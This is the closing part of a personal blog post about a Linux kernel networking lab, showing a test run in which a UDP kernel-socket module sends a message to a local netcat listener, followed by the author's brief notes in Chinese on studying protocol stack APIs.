<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~/skels/networking/<span class="number">5</span>-udp-sock# ./test<span class="number">-5.</span>sh                         </span><br><span class="line">+ pid=<span class="number">241</span>                                                                       </span><br><span class="line">+ sleep <span class="number">1</span>                                                                       </span><br><span class="line">+ ../netcat -l -u -p <span class="number">60001</span>                                                      </span><br><span class="line">+ insmod udp_sock.ko                                                            </span><br><span class="line">udp_sock: loading out-of-tree <span class="keyword">module</span> taints kernel.                             </span><br><span class="line">kernelsocket                                                                    </span><br><span class="line">+ rmmod udp_sock                                                                </span><br><span class="line">+ kill <span class="number">241</span>           </span><br></pre></td></tr></table></figure>
<ul>
<li>感觉本实验的侧重点是对协议栈 API 的使用</li>
<li>之后有时间去专门分析一下这些 API 的底层，了解一下协议堆栈具体的处理过程</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/15/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/15/">15</a><span class="page-number current">16</span><a class="page-number" href="/page/17/">17</a><span class="space">&hellip;</span><a class="page-number" href="/page/33/">33</a><a class="extend next" rel="next" href="/page/17/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">330</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">170</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">4.9m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">74:38</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
